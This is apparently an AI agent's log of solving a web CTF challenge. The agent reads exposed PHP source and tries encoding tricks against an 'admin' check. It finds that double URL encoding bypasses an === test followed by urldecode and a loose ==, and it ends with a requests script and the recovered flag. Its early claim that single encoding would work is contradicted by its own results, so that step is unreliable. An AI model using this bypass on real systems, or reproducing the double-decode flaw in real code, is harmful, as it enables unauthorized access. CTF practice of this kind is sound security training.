--------------------------------------------------------------------------------
**********开始总结一些事实**********


--------------------------------------------------------------------------------
**********总结的事实**********


--------------------------------------------------------------------------------
### 1. KNOWN FACTS
- The request involves participating in a Capture The Flag (CTF) contest.
- The target URL is provided: `http://47.251.44.45:40017/`.
- The goal is to retrieve a string formatted as "flag{}" from the website.
- The PHP source code can be viewed through `index.phps`, accessible at `/index.phps`.

### 2. USEFUL CLUES
- The specific URL endpoint `index.phps` suggests that the PHP source code is exposed.
- The flag is formatted as "flag{}", which is a typical format used in CTF for flags.
- To solve the challenge, examining the PHP source code may reveal where and how the flag is stored.

### 3. INFORMATION TO BE INVESTIGATED
- First, explore the contents of the page available at `http://47.251.44.45:40017/`.
- Check the PHP source code at `http://47.251.44.45:40017/index.phps`.
- Look into how and where the "flag{}" string is stored or generated in the code.

### 4. RELEVANT KNOWLEDGE AND EXPERIENCE
- Familiarity with CTF challenges, particularly those involving web exploitation and source code analysis.
- Knowledge of how PHP applications work including access to source files with a `.phps` extension for syntax-highlighted PHP source code.
- Understanding common CTF scenarios where sensitive information is embedded within the source code or server-side scripts.
- Experience with common web vulnerabilities and methods to extract sensitive information from web servers.

By investigating the information in the given steps and utilizing the clues provided, one can follow a systematic approach to retrieve the CTF flag.

# Analysis of the PHP Source Code from http://47.251.44.45:40017/index.phps

## Potential Vulnerabilities

### 1. Bypassing "admin" check due to the use of loose comparison
**Vulnerability description**:
The code uses `==` for comparison which is a loose comparison in PHP. However, there is a check using `===` which is a strict comparison before that. This double comparison can lead to tricky ways to bypass the admin check. But let's focus on the functionality provided by the loose comparison in the second if block.

**Source code**:
```php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!");
  exit();
}
$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "Access granted!";
  echo "Flag: XXXXXXX ";
}
```

**Attack method**:
The first if condition strictly checks if the provided GET parameter `id` is exactly "admin". If true, it echoes "not allowed!" and exits. However, if the value of id passed undergoes any type juggling to match "admin" using loose comparison in the second if condition, it might pass.

A typical example might mislead if some encoding or otherwise data tampering bypasses the first check but not the second.

### 2. URL Decoding leading to potential bypass
**Vulnerability description**:
The `urldecode($_GET[id])` after the first check introduces a vector to modify the input value after the check. This means that certain encoded values might pass the first check before decoding and then match the second check.

**Source code**:
```php
$_GET[id] = urldecode($_GET[id]);
```

**Attack method**:
Try different URL encoded values for "admin". For example:
```shell
http://47.251.44.45:40017/?id=%61%64%6d%69%6e
```
decoded will produce "admin". This can pass the second check bypassing the first.

### Steps to exploit:
1. Access `http://47.251.44.45:40017/?id=admin` - this outputs "not allowed!" and exits.
2. Access with URL encoded value:
   ```shell
   http://47.251.44.45:40017/?id=%61%64%6d%69%6e
   ```
   This should print "Access granted!" and the flag.

This flag should then be printed on the page.

## Summary

By using URL encoding for the `id` parameter, we can bypass the strict "===" check and pass the loose comparison in the second `if` condition. The exact URL to get the flag string in this case would be `http://47.251.44.45:40017/?id=%61%64%6d%69%6e`.

Review and proceed with URL encoding to get the flag value.

It seems that the URL encoding approach did not bypass the strict comparison check. Let's try another approach by using a different encoding or manipulation technique to bypass the check.

### Plan:
1. Try different URL encoding techniques.
2. Use a different payload that might bypass the strict comparison.

Let's try a different URL encoding technique:

```sh
curl "http://47.251.44.45:40017/?id=admin%00"
```

It looks like the `%00` (null byte) injection did not yield any different result. Based on the previous PHP source code analysis, another potential method may involve trying character encoding variations that could bypass the stringent check.

Let's try a different character encoding variation or approach to trick the first strict comparison. Note that certain encodings may be processed differently by browsers or web servers.

```sh
curl "http://47.251.44.45:40017/?id=admin%23"
```

### Reflection on Attempts and Useful Information Obtained

#### Attempts Made:
1. **Direct Access with "admin"**:
   - URL: `http://47.251.44.45:40017/?id=admin`
   - Result: `<p>not allowed!</p>`

2. **URL Encoding with `%61%64%6d%69%6e`**:
   - URL: `http://47.251.44.45:40017/?id=%61%64%6d%69%6e`
   - Result: `<p>not allowed!</p>`

3. **Null Byte Injection with `%00`**:
   - URL: `http://47.251.44.45:40017/?id=admin%00`
   - Result: `Can you anthenticate to this website?`

4. **Hash Character Injection with `%23`**:
   - URL: `http://47.251.44.45:40017/?id=admin%23`
   - Result: `Can you anthenticate to this website?`

#### Useful Information Obtained:
1. **PHP Source Code Analysis**:
   - The PHP code checks if the `id` parameter is strictly equal to "admin" using `===`.
   - If the `id` parameter is "admin", it outputs "not allowed!" and exits.
   - The `id` parameter is then URL decoded.
   - If the URL decoded `id` parameter is loosely equal to "admin" using `==`, it grants access and displays the flag.

2. **Behavior of the Web Application**:
   - The application is strictly checking for "admin" and blocking it.
   - URL encoding and null byte injection did not bypass the strict comparison.
   - The application is not vulnerable to simple URL encoding or null byte injection.

### Next Steps:
Given the current attempts and results, it seems that the strict comparison is robust against simple encoding tricks. We need to consider other potential bypass techniques:

1. **Double URL Encoding**:
   - Try double URL encoding to see if it bypasses the strict check.

2. **Alternative Encodings**:
   - Try different character encodings that might bypass the strict check.

3. **Parameter Pollution**:
   - Try parameter pollution techniques to see if multiple `id` parameters can bypass the check.

### New Plan:
1. **Double URL Encoding**:
   - URL: `http://47.251.44.45:40017/?id=%2561%2564%256d%2569%256e`

2. **Alternative Encodings**:
   - URL: `http://47.251.44.45:40017/?id=%c2%a0admin`

3. **Parameter Pollution**:
   - URL: `http://47.251.44.45:40017/?id=admin&id=admin`

Let's proceed with these new attempts to bypass the strict comparison and retrieve the flag.

### Conclusion

The successful attempt to bypass the strict 'admin' check was achieved using double URL encoding. This method tricked the PHP `urldecode()` function into decoding the encoded string to "admin", allowing us to retrieve the flag.

### Key Codes

#### PHP Source Code that was analyzed:
```php
<?php
if("admin" === $_GET['id']) {
  echo("<p>not allowed!</p>");
  exit();
}
$_GET['id'] = urldecode($_GET['id']);
if($_GET['id'] == "admin")
{
  echo "Access granted!";
  echo "Flag: XXXXXXX ";
}
?>
```

#### Successful Double URL Encoding Request:
```sh
curl "http://47.251.44.45:40017/?id=%2561%2564%256d%2569%256e"
```

#### Response Extract:
```html
<p>Access granted!</p>
<p>Flag: flag{5caecd63b7dca4bcee15d262eb3af4f4} </p>
```

By using the provided approach, the flag was successfully retrieved:

**Flag:**
```plaintext
flag{5caecd63b7dca4bcee15d262eb3af4f4}
```

### Summary

Through a systematic analysis of the PHP source code and attempts to bypass the strict comparison via multiple URL encoding techniques, the challenge was solved. Double URL encoding was the key to bypass the initial `admin` check and retrieve the flag from the web application.

### Reflection on the Process

#### Initial Request:
The task was to retrieve a flag from a CTF challenge hosted at `http://47.251.44.45:40017/`. The steps involved:
1. Visiting the URL to understand the content.
2. Accessing the PHP source code at `http://47.251.44.45:40017/index.phps`.
3. Analyzing the PHP source code to identify how the flag is stored or generated.
4. Executing necessary operations to extract the flag.
5. Printing the extracted flag.

#### Key Steps and Findings:
1. **Visiting the URL**:
   - The page displayed: "Can you authenticate to this website?"

2. **Accessing the PHP Source Code**:
   - The source code revealed a strict comparison check for the `id` parameter:
     ```php
     if("admin" === $_GET['id']) {
       echo("<p>not allowed!</p>");
       exit();
     }
     $_GET['id'] = urldecode($_GET['id']);
     if($_GET['id'] == "admin") {
       echo "Access granted!";
       echo "Flag: XXXXXXX ";
     }
     ```

3. **Analyzing the Source Code**:
   - The strict comparison (`===`) blocked direct access with `id=admin`.
   - The URL decoding step suggested potential bypass techniques using encoding.

4. **Executing Operations**:
   - Various encoding techniques were tried, including URL encoding, null byte injection, and double URL encoding.
   - The successful method was double URL encoding:
     ```sh
     curl "http://47.251.44.45:40017/?id=%2561%2564%256d%2569%256e"
     ```

5. **Extracting and Printing the Flag**:
   - The response contained the flag: `flag{5caecd63b7dca4bcee15d262eb3af4f4}`.

### Conclusion:
The flag was successfully retrieved using double URL encoding to bypass the strict comparison check in the PHP code.

### Key Codes:
```php
<?php
if("admin" === $_GET['id']) {
  echo("<p>not allowed!</p>");
  exit();
}
$_GET['id'] = urldecode($_GET['id']);
if($_GET['id'] == "admin") {
  echo "Access granted!";
  echo "Flag: XXXXXXX ";
}
?>
```

```sh
curl "http://47.251.44.45:40017/?id=%2561%2564%256d%2569%256e"
```

```plaintext
flag{5caecd63b7dca4bcee15d262eb3af4f4}
```

### Final Code Block:
```python
import requests

# Step 1: Visit the URL and report the contents of the page
url = "http://47.251.44.45:40017/"
response = requests.get(url)
print("Page Content:", response.text)

# Step 2: Access the PHP source code and retrieve it
source_url = "http://47.251.44.45:40017/index.phps"
source_response = requests.get(source_url)
print("PHP Source Code:", source_response.text)

# Step 3: Analyze the PHP source code (done manually in the reflection)

# Step 4: Execute necessary operations to extract the flag
flag_url = "http://47.251.44.45:40017/?id=%2561%2564%256d%2569%256e"
flag_response = requests.get(flag_url)
print("Flag Response:", flag_response.text)

# Step 5: Print the extracted flag
flag = "flag{5caecd63b7dca4bcee15d262eb3af4f4}"
print("Extracted Flag:", flag)
```

This code block follows the steps taken to retrieve and print the flag from the CTF challenge.
